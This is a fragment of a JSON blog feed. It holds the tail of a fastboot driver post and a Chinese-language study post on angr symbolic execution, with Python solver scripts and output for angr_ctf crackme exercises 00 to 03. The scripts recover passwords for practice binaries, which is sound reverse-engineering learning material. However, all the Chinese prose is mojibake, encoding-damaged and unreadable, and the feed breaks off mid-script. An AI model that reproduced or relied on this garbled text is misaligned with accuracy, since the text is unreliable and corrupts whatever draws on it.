´é˜²ä¹‹ fastboot ä¸‹è½½è°·æ­Œ USB é©±åŠ¨åè¿˜æ˜¯æ²¡ææ‡‚</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230424211506.png\" alt=\"QQå›¾ç‰‡20230424211506\"> åˆåœ¨ç½‘ä¸Šæœåˆ°è¯´æ˜¯ç‰ˆæœ¬é—®é¢˜ä¹‹åˆä¸‹äº†ä¸¤ä¸ªç‰ˆæœ¬è¿˜æ˜¯ä¸è¡Œæœ€å<img data-src=\"/images/image-20230424223839731.png\" alt=\"image-20230424223839731\"></p>\n<p>åˆçªç„¶å¯ä»¥äº† (ä¼°è®¡æ˜¯æˆ‘ä¹‹å‰æ²¡æœ‰ bootloaderâ€¦)</p>\n<h5 id=\"æˆåŠŸ\"><a class=\"markdownIt-Anchor\" href=\"#æˆåŠŸ\">#</a> æˆåŠŸï¼</h5>\n<p><img data-src=\"/images/image-20230425212930029.png\" alt=\"image-20230425212930029\"></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/04/16/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "url": "https://3cly.github.io/2023/04/16/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "title": "Angrç¬¦å·æ‰§è¡Œå­¦ä¹ ç¬”è®°",
            "date_published": "2023-04-16T12:50:29.000Z",
            "content_html": "<h1 id=\"angrå­¦ä¹ \"><a class=\"markdownIt-Anchor\" href=\"#angrå­¦ä¹ \">#</a> Angr å­¦ä¹ </h1>\n<p>å­¦ä¹  angr å€Ÿé‰´äº† Syclover æˆ˜é˜Ÿå¤§ä½¬ SYJ çš„ç¬”è®° https://agate-colony-3f5.notion.site/angr_ctf-8a26aa74a4a74c428ef6129e2df6dd02</p>\n<h2 id=\"angr\"><a class=\"markdownIt-Anchor\" href=\"#angr\">#</a> Angr</h2>\n<p>angr æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶åˆ†ææ¡†æ¶ï¼Œå®ƒå¯ä»¥ç”¨äºé™æ€å’ŒåŠ¨æ€åˆ†æï¼Œä»¥åŠæ¼æ´å‘ç°ç­‰æ–¹é¢ã€‚å®ƒè¢«è®¾è®¡ç”¨æ¥å¤„ç†äºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒåŒ…æ‹¬ ELFï¼ŒPE å’Œ Mach-O ç­‰æ–‡ä»¶æ ¼å¼ã€‚</p>\n<p>angr æä¾›äº†ä¸€ä¸ª Python APIï¼Œå¯ä»¥ç”¨æ¥ç¼–å†™è„šæœ¬æ¥è‡ªåŠ¨åŒ–åˆ†æè¿‡ç¨‹ã€‚å®ƒæ”¯æŒå¤šç§åˆ†ææŠ€æœ¯ï¼ŒåŒ…æ‹¬ç¬¦å·æ‰§è¡Œï¼ŒåŠ¨æ€ç¬¦å·æ‰§è¡Œå’Œæ¨¡ç³Šæµ‹è¯•ç­‰ã€‚å®ƒè¿˜æä¾›äº†ä¸€äº›æœ‰ç”¨çš„å·¥å…·ï¼Œå¦‚ç¬¦å·æ‰§è¡Œå™¨ã€ç¬¦å·å†…å­˜å’Œç¬¦å·å¯„å­˜å™¨ç­‰ï¼Œä»¥å¸®åŠ©ç”¨æˆ·è¿›è¡Œæ·±å…¥çš„åˆ†æã€‚</p>\n<p>angr çš„ä¸€ä¸ªä¼˜ç‚¹æ˜¯å®ƒå¯ä»¥åœ¨ä¸éœ€è¦äººå·¥å¹²é¢„çš„æƒ…å†µä¸‹è¿›è¡Œè‡ªåŠ¨åŒ–åˆ†æã€‚è¿™ä½¿å…¶æˆä¸ºå®‰å…¨ç ”ç©¶äººå‘˜å’Œæ¼æ´çŒäººçš„æœ‰ç”¨å·¥å…·ï¼Œä»–ä»¬å¯ä»¥ä½¿ç”¨ angr æ¥è‡ªåŠ¨å‘ç°æ¼æ´å¹¶ç”Ÿæˆåˆ©ç”¨ä»£ç ã€‚</p>\n<h3 id=\"ä½¿ç”¨-angr-çš„å¤§æ¦‚æ­¥éª¤\"><a class=\"markdownIt-Anchor\" href=\"#ä½¿ç”¨-angr-çš„å¤§æ¦‚æ­¥éª¤\">#</a> ä½¿ç”¨ angr çš„å¤§æ¦‚æ­¥éª¤</h3>\n<ul>\n<li>åˆ›å»º project</li>\n<li>è®¾ç½® state</li>\n<li>æ–°å»º ç¬¦å·é‡ : BVS (bitvector symbolic) æˆ– BVV (bitvector value) [çº¦æŸæ±‚è§£æ—¶çš„è‡ªå˜é‡ï¼Œå¯ç±»æ¯” z3]</li>\n<li>æŠŠç¬¦å·é‡è®¾ç½®åˆ°å†…å­˜æˆ–è€…å…¶ä»–åœ°æ–¹ (è¿™ä¸¤æ­¥éå¿…é¡»)</li>\n<li>è®¾ç½® Simulation Managers ï¼Œ è¿›è¡Œè·¯å¾„æ¢ç´¢çš„å¯¹è±¡</li>\n<li>è¿è¡Œï¼Œæ¢ç´¢æ»¡è¶³è·¯å¾„éœ€è¦çš„å€¼</li>\n<li>çº¦æŸæ±‚è§£ï¼Œè·å–æ‰§è¡Œç»“æœ</li>\n</ul>\n<h3 id=\"00_angr_find\"><a class=\"markdownIt-Anchor\" href=\"#00_angr_find\">#</a> 00_angr_find</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># åŠ è½½å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./00_angr_find\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># æ‰¾åˆ°å…¥å£</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>entry_state<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># åˆ›å»ºæ¨¡æ‹Ÿç®¡ç†å™¨ï¼Œæ”¯æŒæœç´¢å’Œæ‰§è¡Œ</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># è®¾ç½®è¦è¿›å…¥çš„ä½ç½®:integer (probably in hexadecimal)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span><span class=\"token number\">0x08048678</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># æŸ¥çœ‹ç»“æœçŠ¶æ€</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>solution_state <span class=\"token operator\">=</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># è¾“å‡ºç»“æœ</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>solution_state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdin<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/images/image-20230407212823955.png\" alt=\"image-20230407212823955\"></p>\n<p><img data-src=\"/images/image-20230407212849218.png\" alt=\"image-20230407212849218\"></p>\n<h3 id=\"01_angr_avoid\"><a class=\"markdownIt-Anchor\" href=\"#01_angr_avoid\">#</a> 01_angr_avoid</h3>\n<p>ä½¿ç”¨.explore () æ–¹æ³•çš„å¦ä¸€ä¸ªå‚æ•° avoid æ¥å›é¿ avoid_me å‡½æ•°å³å¯ (å¦‚æœ IDA æŒ‰ TAB ä¼šæç¤º main å‡½æ•°è¿‡å¤§)<img data-src=\"/images/image-20230410164448520.png\" alt=\"image-20230410164448520\"></p>\n<p>ç›´æ¥æ‰¾åˆ° 2 ä¸ªå‡½æ•°çš„åœ°å€å°±èƒ½å†™è„šæœ¬äº†</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># åŠ è½½å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./01_angr_avoid\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># æ‰¾åˆ°å…¥å£</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>entry_state<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># åˆ›å»ºæ¨¡æ‹Ÿç®¡ç†å™¨ï¼Œæ”¯æŒæœç´¢å’Œæ‰§è¡Œ</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># è®¾ç½®è¦è¿›å…¥çš„ä½ç½®ï¼Œå›é¿çš„å‡½æ•°</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span><span class=\"token number\">0x80485f7</span><span class=\"token punctuation\">,</span>avoid<span class=\"token operator\">=</span><span class=\"token number\">0x80485bf</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># æŸ¥çœ‹ç»“æœçŠ¶æ€</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>solution_state <span class=\"token operator\">=</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># è¾“å‡ºç»“æœ</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>solution_state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdin<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><strong>ç»“æœ:</strong></p>\n<pre><code>root@mou-virtual-machine:/home/mou/æ¡Œé¢/angr_ctf-master/solutions/01_angr_avoid#\n python3 try.py\nWARNING  | 2023-04-10 16:51:27,641 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing register with an unspecified value. This could indicate unwanted behavior.\nWARNING  | 2023-04-10 16:51:27,641 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:\nWARNING  | 2023-04-10 16:51:27,642 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state\nWARNING  | 2023-04-10 16:51:27,642 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to make unknown regions hold null\nWARNING  | 2023-04-10 16:51:27,642 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to suppress these messages.\nWARNING  | 2023-04-10 16:51:27,642 | angr.storage.memory_mixins.default_filler_mixin | Filling register edi with 4 unconstrained bytes referenced from 0x80d45b1 (__libc_csu_init+0x1 in 01_angr_avoid (0x80d45b1))\nWARNING  | 2023-04-10 16:51:31,839 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7ffeff3d with 11 unconstrained bytes referenced from 0x819b3b0 (strncmp+0x0 in libc.so.6 (0x9b3b0))\nWARNING  | 2023-04-10 16:51:31,839 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7ffeff60 with 4 unconstrained bytes referenced from 0x819b3b0 (strncmp+0x0 in libc.so.6 (0x9b3b0))\nb'JLVUSGJZ'\nroot@mou-virtual-machine:/home/mou/æ¡Œé¢/angr_ctf-master/solutions/01_angr_avoid#\n ./01_angr_avoid\nEnter the password: JLVUSGJZ\nGood Job.\n</code></pre>\n<h3 id=\"02_angr_find_condition\"><a class=\"markdownIt-Anchor\" href=\"#02_angr_find_condition\">#</a> 02_angr_find_condition</h3>\n<p>å­¦ä¹ æ ¹æ®ç¨‹åºæœ¬èº«çš„è¾“å‡ºæ¥å‘Šè¯‰ angr åº”é¿å…æˆ–ä¿ç•™çš„å†…å®¹ï¼Œè€Œä¸æ˜¯æ¯æ¬¡éƒ½æ‰¾æ‰“å°é”™è¯¯æç¤ºçš„å‡½æ•°åœ°å€</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Go</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./02_angr_find_condition\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">,</span> auto_load_libs<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>entry_state<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">is_successful</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#è¾“å‡ºå†…å®¹æ”¾åˆ°å˜é‡ä¸­</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b'Good Job.'</span> <span class=\"token keyword\">in</span> stdout_output<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">should_abort</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b'Try again.'</span> <span class=\"token keyword\">in</span>  stdout_output<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>is_successful<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>should_abort<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        solution_state <span class=\"token operator\">=</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        solution <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdin<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Solution is: &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    Go<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œè¿™ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯å­—èŠ‚å¯¹è±¡ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¿…é¡»ä½¿ç”¨ bâ€™Good Job.' è€Œä¸æ˜¯ä»… &quot;Good Job.&quot; æ¥æ£€æŸ¥æˆ‘ä»¬æ˜¯å¦æ­£ç¡®è¾“å‡ºäº† â€œGood Job.â€</p>\n<h3 id=\"03_angr_simbolic_registers\"><a class=\"markdownIt-Anchor\" href=\"#03_angr_simbolic_registers\">#</a> 03_angr_simbolic_registers</h3>\n<p>å­¦ä¼šç¬¦å·åŒ–å¯„å­˜å™¨</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">is_successful</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'Good Job.\\n'</span> <span class=\"token keyword\">in</span> stdout_output<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">should_abort</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'Try again.\\n'</span> <span class=\"token keyword\">in</span> stdout_output<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Go</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./03_angr_symbolic_registers\"</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    start_address <span class=\"token operator\">=</span> <span class=\"token number\">0x80488c7</span> </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>blank_state<span class=\"token punctuation\">(</span>addr<span class=\"token operator\">=</span>start_address<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    passwd_size_in_bits <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    passwd0 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd0'</span><span class=\"token punctuation\">,</span> passwd_size_in_bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    passwd1 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd1'</span><span class=\"token punctuation\">,</span> passwd_size_in_bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    passwd2 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd2'</span><span class=\"token punctuation\">,</span> passwd_size_in_bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    initial_state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>eax <span class=\"token operator\">=</span> passwd0</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    initial_state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>ebx <span class=\"token operator\">=</span> passwd1</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    initial_state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>edx <span class=\"token operator\">=</span> passwd2</pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>is_successful<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>should_abort<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            solution_state <span class=\"token operator\">=</span> i</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            solution0 <span class=\"token operator\">=</span> <span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>solution_state<span class=\"token 